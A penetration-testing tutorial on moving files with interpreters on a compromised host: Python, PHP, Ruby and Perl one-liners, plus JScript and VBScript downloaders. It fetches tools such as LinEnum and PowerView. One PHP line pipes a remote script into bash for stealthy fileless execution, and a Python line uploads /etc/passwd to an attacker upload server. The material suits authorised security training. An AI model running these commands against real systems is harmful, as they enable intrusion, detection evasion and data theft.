When performing penetration tests, it is very common to find programming languages already installed on the target system. Languages such as **Python, PHP, Perl, Ruby, JavaScript, and VBScript** can be leveraged to **download, upload, or execute files** without relying on external tools like `wget` or `curl`.

This technique is especially useful in **restricted environments**, **fileless attacks**, or when **standard utilities are missing or monitored**.

---

## Python

Python is one of the most common languages available on Linux systems and is sometimes present on Windows. Both **Python 2.7** and **Python 3** may be encountered.

Python allows execution of one-liners using the `-c` flag.

### Python 2 – File Download

Uses the `urllib` module to retrieve a file from a remote server.

```bash
python2.7 -c 'import urllib; urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- `urllib.urlretrieve()` downloads the file
    
- The second argument specifies the local filename
    

### Python 3 – File Download

Uses `urllib.request` instead of `urllib`.

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---

## PHP

PHP is extremely common on web servers and often available during web application attacks. PHP supports running one-liners using the `-r` option.

### PHP Download Using file_get_contents()

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh", $file);'
```

- `file_get_contents()` fetches the remote file
    
- `file_put_contents()` saves it locally
    

### PHP Download Using fopen()

```bash
php -r 'const BUFFER = 1024;
$fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb");
$flocal = fopen("LinEnum.sh", "wb");
while ($buffer = fread($fremote, BUFFER)) {
    fwrite($flocal, $buffer);
}
fclose($flocal);
fclose($fremote);'
```

- Reads the file in chunks
    
- Useful for larger files or lower memory usage
    


### PHP Fileless Execution (Pipe to Bash)

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh");
foreach ($lines as $line) { echo $line; }' | bash
```

- Executes the script **without writing it to disk**
    
- Useful for evasion and stealth
    

---

## Ruby

Ruby supports one-liners using the `-e` option and can download files using the `net/http` library.

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

## Perl

Perl is commonly installed on Unix-like systems and supports file downloads using `LWP::Simple`.

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

## JavaScript (Windows)

JavaScript can be executed on Windows using **cscript.exe** and **ActiveX objects**.

### JavaScript Downloader (wget.js)

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

var BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Execute JavaScript Download

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---

## VBScript (Windows)

VBScript is installed by default on most Windows systems and can also be executed using `cscript.exe`.

### VBScript Downloader (wget.vbs)

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Execute VBScript Download

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---

## Uploading Files Using Python 3

Uploading files requires sending HTTP **POST** requests. Python’s `requests` module is commonly used for this purpose.


### Start Python Upload Server

```bash
python3 -m uploadserver
```

- Starts an HTTP server on port **8000**
    
- Accepts file uploads at `/upload`
    

### Upload a File Using Python One-liner

```bash
python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd","rb")})'
```
